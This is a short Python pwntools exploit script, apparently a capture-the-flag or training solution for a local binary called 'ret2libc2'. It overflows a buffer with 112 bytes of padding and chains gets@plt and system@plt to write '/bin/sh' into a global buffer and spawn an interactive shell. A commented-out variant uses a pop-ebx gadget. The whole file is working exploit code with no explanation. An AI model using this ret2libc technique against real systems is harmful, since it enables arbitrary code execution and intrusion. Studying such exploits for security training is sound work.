from pwn import *
sh = process("./ret2libc2")
elf = ELF("./ret2libc2")

systemplt = elf.plt["system"]
getsplt = elf.plt["gets"]

bufaddr = elf.symbols['buf2']  # bufaddr = 0x0804A080
addesp = 0x0804843d #  0x0804843d : pop ebx ; ret

# payload = flat([b'a' * 112, getsplt, addesp, bufaddr, systemplt, b'b'*4, bufaddr])

payload = flat([b'a' * 112, getsplt, systemplt, bufaddr, bufaddr])
sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive()

